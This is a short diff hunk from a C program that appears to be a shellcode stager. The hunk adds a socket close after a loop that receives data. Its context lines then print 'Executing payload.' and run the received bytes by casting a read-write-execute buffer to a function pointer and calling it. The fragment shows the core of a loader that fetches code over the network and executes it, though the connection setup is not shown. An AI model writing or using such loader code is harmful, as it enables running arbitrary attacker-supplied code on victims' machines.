@@ -52,6 +52,8 @@ int main() {
     rcvd += res;
   } while (size > rcvd);
 
+  closesocket(ConnectSocket);
+
   printf("Executing payload.\n");
   // Execute the received payload
   (*(void(*)()) (rwx + 4))();
